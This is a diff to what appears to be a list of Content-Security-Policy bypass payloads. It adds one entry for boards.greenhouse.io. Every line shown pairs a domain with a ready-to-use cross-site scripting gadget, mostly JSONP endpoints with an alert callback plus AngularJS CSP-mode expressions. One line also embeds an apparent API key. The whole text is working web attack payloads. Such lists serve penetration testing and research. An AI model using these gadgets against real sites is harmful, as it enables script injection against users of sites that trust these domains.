@@ -50,6 +50,7 @@ apps.bdimg.com	<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angu
 assets.grubhub.com	<body ng-app ng-csp><script src="https://assets.grubhub.com/libs/js/angular/1.8.3/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 assets.guim.co.uk	<script src=https://assets.guim.co.uk/polyfill.io/v3/polyfill.min.js?callback=alert></script>
 assets.twitch.tv  <script src="https://assets.twitch.tv/eppo/api/flag-config/v1/config?sdkName=js-sdk-client&sdkVersion=3.1.2&apiKey=3mv-BKCSZJDyZrwfqK86har6u13NgxRh.ZWg9bTRsZHJnLmUuZXBwby5jbG91ZCZjcz1tNGxkcmc&callback=alert()">
+boards.greenhouse.io  <script src="https://boards.greenhouse.io/uncacheable_attributes/presigned_fields?callback=alert"></script>
 bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>
 buy.tinypass.com   <script src="https://buy.tinypass.com/api/v3/anon/template/loadTemplateContext?callback=alert"></script>
 c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>
